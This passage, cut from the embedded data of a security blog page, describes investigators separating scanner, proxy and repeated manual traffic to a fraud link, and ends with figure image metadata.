data showed repeated interaction through VPNs, proxy services and several non-hosting internet connections. Some visits were separated by hours or days and used different browser profiles, behaviour consistent with a person returning to the link and attempting to retrieve the promised payment information.\u003c/p\u003e\u003cp\u003eThe network data helped us separate scanner traffic, proxy infrastructure and repeated manual access, but it was not enough to attribute the operation. Some later visits came from ordinary ISP ranges, although those connections show where the traffic exited, not necessarily where the fraudsters were located.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe later visits showed repeated manual access by someone connected to the fraud operation, including long after the supposed transfer should have been completed.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-09/3.png.webp?itok=Ehkk4KTA 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-09/3.png.webp?itok=Je3qdknb 2x","media":"(min-width: 1020px)","type":"image/webp","width":1024,"height":768},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-09/3.png.webp?itok=1ataiWnB 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-09/3.png.webp?itok=EORM3ViU 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":668},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-09/3.png.webp?itok=hXXeoSeS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-09/3.png.webp?itok=xNY8mFa9 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":518}],"caption":"Figure 4.
